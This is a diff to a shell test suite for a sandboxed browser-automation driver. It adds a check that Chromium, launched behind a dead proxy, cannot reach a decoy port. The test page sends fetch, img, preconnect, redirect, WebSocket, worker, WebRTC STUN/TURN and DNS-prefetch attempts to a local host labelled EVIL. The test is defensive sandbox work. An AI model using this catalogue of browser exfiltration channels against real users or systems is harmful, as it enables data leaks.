@@ -54,32 +54,65 @@ ck "  a flow that expects nothing is refused as proving nothing" 'jq -r ".errors
 
 # ---- round 5 H2: the page under check cannot open a WebSocket to another address, and the browser keeps its own sandbox ----------------------
 ck "H2 the driver closes every WebSocket that is not to the app's own address, and launches Chromium with its renderer sandbox on" 'grep -q "routeWebSocket" "$REAL/bin/browse.mjs" && grep -q "chromiumSandbox: true" "$REAL/bin/browse.mjs"'
+ck "M4 the driver launches Chromium behind a dead proxy with only the app bypassing it, no name lookups, and no WebRTC UDP outside the proxy" '( for f in "--proxy-server=" "--proxy-bypass-list=<-loopback>;" "--host-resolver-rules=MAP \* ~NOTFOUND , EXCLUDE" "--webrtc-ip-handling-policy=disable_non_proxied_udp" "serviceWorkers: \"block\""; do grep -q -e "$f" "$REAL/bin/browse.mjs" || exit 1; done )'
 if st_have_browser; then
   WSP=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()')
   WSE=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()')
+  # #115 M4: the app's page tries every way out it has to a decoy on a second loopback port (TCP and UDP): fetch, img, preconnect,
+  # a 302 from the app itself to the decoy (round 7 M3: route() sees only the first URL), WebSocket, a dedicated, shared and service worker, WebRTC with the decoy as STUN and TURN server, and a name lookup
+  # (fetch and dns-prefetch of a made-up name). The decoy must receive nothing, and Chromium's own network log must show no name lookup.
   cat > "$T/wssrv.py" <<'PY'
 import http.server, socketserver, sys, threading, socket
 APP, EVIL, LOG = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3]
-page = f"""<html><body><h1>hello app</h1><script>
-try{{new WebSocket('ws://127.0.0.1:{EVIL}/ws-leak?d=DECOY')}}catch(e){{}}
-try{{fetch('http://127.0.0.1:{EVIL}/fetch-leak?d=DECOY')}}catch(e){{}}
+E = f"127.0.0.1:{EVIL}"
+page = f"""<html><head><link rel="dns-prefetch" href="//dns-canary-m4.example"><link rel="preconnect" href="http://{E}"></head>
+<body><h1>hello app</h1><img src="http://{E}/img-leak"><img src="/r?img"><script>
+fetch('/r?fetch').catch(function(){{}});
+try{{new WebSocket('ws://{E}/ws-leak?d=DECOY')}}catch(e){{}}
+fetch('http://{E}/fetch-leak?d=DECOY').catch(function(){{}});
+fetch('http://localhost:{EVIL}/localhost-leak').catch(function(){{}});
+fetch('http://dns-canary-m4.example/name-leak').catch(function(){{}});
+try{{new Worker('/w.js?dedicated')}}catch(e){{}}
+try{{new SharedWorker('/w.js?shared')}}catch(e){{}}
+try{{navigator.serviceWorker.register('/w.js?service').catch(function(){{}})}}catch(e){{}}
+try{{var pc=new RTCPeerConnection({{iceServers:[{{urls:'stun:{E}'}},{{urls:['turn:{E}?transport=udp','turn:{E}?transport=tcp'],username:'u',credential:'p'}}]}});
+pc.createDataChannel('x');pc.createOffer().then(function(o){{return pc.setLocalDescription(o)}})}}catch(e){{}}
 </script></body></html>"""
+worker = f"""fetch('http://{E}/worker-fetch').catch(function(){{}});try{{new WebSocket('ws://{E}/worker-ws')}}catch(e){{}}
+try{{var pc=new RTCPeerConnection({{iceServers:[{{urls:'stun:{E}'}}]}});pc.createDataChannel('x');pc.createOffer().then(function(o){{return pc.setLocalDescription(o)}})}}catch(e){{}}"""
 class H(http.server.BaseHTTPRequestHandler):
     def do_GET(s):
-        s.send_response(200); s.send_header("content-type", "text/html"); s.end_headers(); s.wfile.write(page.encode())
+        if s.path.startswith("/r"):   # round 7 M3: route() sees only the first URL of a redirect
+            s.send_response(302); s.send_header("location", f"http://{E}/redirect-leak?d=DECOY"); s.end_headers(); return
+        js = s.path.startswith("/w.js"); s.send_response(200); s.send_header("content-type", "text/javascript" if js else "text/html"); s.end_headers()
+        s.wfile.write((worker if js else page).encode())
     def log_message(*a): pass
-def evil():
+def tcp():
     ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); ls.bind(("127.0.0.1", EVIL)); ls.listen(5)
     while True:
-        c, _ = ls.accept(); d = c.recv(2000).split(b"\r\n")[0]; open(LOG, "ab").write(d + b"\n"); c.close()
-threading.Thread(target=evil, daemon=True).start()
+        c, _ = ls.accept(); c.settimeout(1)
+        try: d = c.recv(2000).split(b"\r\n")[0]
+        except Exception: d = b""
+        open(LOG, "ab").write(b"tcp " + d + b"\n"); c.close()
+def udp():
+    us = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); us.bind(("127.0.0.1", EVIL))
+    while True: us.recvfrom(4000); open(LOG, "ab").write(b"udp datagram\n")
+threading.Thread(target=tcp, daemon=True).start(); threading.Thread(target=udp, daemon=True).start()
 socketserver.TCPServer(("127.0.0.1", APP), H).serve_forever()
 PY
   : > "$T/ws-evil.log"; python3 "$T/wssrv.py" "$WSP" "$WSE" "$T/ws-evil.log" & WSPID=$!; sleep 1
-  printf '{"base":"http://127.0.0.1:%s","flows":[{"title":"t","steps":[{"op":"goto","path":"/"},{"op":"wait","ms":2500},{"op":"expect_text","text":"hello"}]}]}' "$WSP" > "$T/wsplan.json"
-  wsout=$(node "$T/bin/browse.mjs" run "$T/wsplan.json" "$T/wsout" 2>&1)
+  printf '{"base":"http://127.0.0.1:%s","flows":[{"title":"t","steps":[{"op":"goto","path":"/"},{"op":"wait","ms":3000},{"op":"expect_text","text":"hello"}]},{"title":"redirect","steps":[{"op":"goto","path":"/r?goto"},{"op":"wait","ms":1000},{"op":"expect_text","text":"x"}]}]}' "$WSP" > "$T/wsplan.json"
+  wsout=$(QUARTERDECK_BROWSE_NETLOG="$T/netlog.json" node "$T/bin/browse.mjs" run "$T/wsplan.json" "$T/wsout" 2>&1)
   kill "$WSPID" 2>/dev/null; wait "$WSPID" 2>/dev/null
-  ck "H2 a page that opens a WebSocket and a fetch to another address reaches neither, and the flow still runs" '[ ! -s "$T/ws-evil.log" ] && jq -e ".flows[0].ok == true" <<<"$wsout" >/dev/null'
+  ck "H2/M4 a page that tries fetch, img, preconnect, a redirect from the app (page, img, fetch), WebSocket, workers and WebRTC to another loopback port reaches none of them (TCP or UDP), and the flow still runs" '[ ! -s "$T/ws-evil.log" ] && jq -e ".flows[0].ok == true" <<<"$wsout" >/dev/null || { cat "$T/ws-evil.log"; echo "$wsout" | head -c 400; false; }'
+  ck "M4 no name at all was looked up while the page ran, the page's or Chromium's own (Chromium's network log)" 'python3 - "$T/netlog.json" <<"PY"
+import json, sys
+raw = open(sys.argv[1]).read().rstrip().rstrip(",")
+d = json.loads(raw if raw.endswith("}") else raw + "]}")
+kind = {v: k for k, v in d["constants"]["logEventTypes"].items()}
+seen = [kind[e["type"]] + " " + json.dumps(e.get("params", {}))[:120] for e in d["events"] if kind[e["type"]] in ("DNS_TRANSACTION_QUERY", "HOST_RESOLVER_SYSTEM_TASK", "HOST_RESOLVER_DNS_TASK")]
+print("\n".join(seen[:5])); sys.exit(1 if seen else 0)
+PY'
 else
   st_skip "H2 live WebSocket check (no playwright or no browser on this machine)"
 fi
